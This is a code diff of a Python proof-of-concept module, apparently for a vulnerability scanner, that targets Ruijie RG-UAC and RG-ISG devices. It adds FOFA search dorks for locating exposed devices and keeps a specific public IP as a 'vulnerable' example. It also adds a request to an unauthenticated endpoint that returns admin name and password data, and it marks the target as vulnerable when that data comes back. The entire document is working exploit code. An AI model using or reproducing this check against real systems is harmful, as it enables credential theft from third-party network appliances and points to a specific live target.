@@ -29,6 +29,8 @@ class POC(POCBase):
 
         "fofa-dork":"""
             title="RG-UAC登录页面"
+            app="Ruijie-RG-ISG"
+            app="Ruijie-RG-UAC"
         """,                     # fofa搜索语句
         "example" : "https://60.2.178.226:1443",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -43,23 +45,26 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "" # url自己按需调整
-        
+        urls = [
+            "",
+            "/get_dkey.php?user=admin"
+            ]
 
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
-                    # "Content-Type": "application/x-www-form-urlencoded",
                     }
         
         try:
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "pre_define" in req.text and "name" in req.text and "password" in req.text:#req.status_code == 200 and :
-                vuln = [True,req.text]
-            else:
-                vuln = [False,req.text]
+            for i in urls:
+                url = self.target + i
+                req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+                if "pre_define" in req.text and "name" in req.text and "password" in req.text:
+                    vuln = [True,"<title>"+url+"</title>"]
+                    break
+                
         except Exception as e:
             raise e
         
